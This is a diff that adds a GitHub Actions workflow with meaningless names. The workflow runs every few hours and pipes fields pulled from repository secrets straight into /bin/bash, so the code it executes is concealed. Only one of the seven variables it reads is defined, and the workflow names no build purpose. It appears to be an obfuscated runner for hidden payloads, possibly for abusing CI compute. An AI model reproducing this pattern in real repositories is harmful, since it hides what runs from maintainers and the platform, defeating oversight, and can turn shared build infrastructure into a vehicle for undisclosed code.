@@ -1,0 +1,24 @@
+name: guoshantui4678
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: guoshantui4678
+        env:
+          bm6: ${{ secrets.bm6 }}
+        run: |
+          echo $bm6 | jq -r .i383 | /bin/bash
+          echo $te3 | jq -r .bua76089 | /bin/bash
+          echo $xlawt78805 | jq -r .d50 | /bin/bash
+          echo $xbmtr19611 | jq -r .k936 | /bin/bash
+          echo $d89 | jq -r .qd42 | /bin/bash
+          echo $oev384 | jq -r .i21 | /bin/bash
+          echo $tt627 | jq -r .vw956 | /bin/bash
+
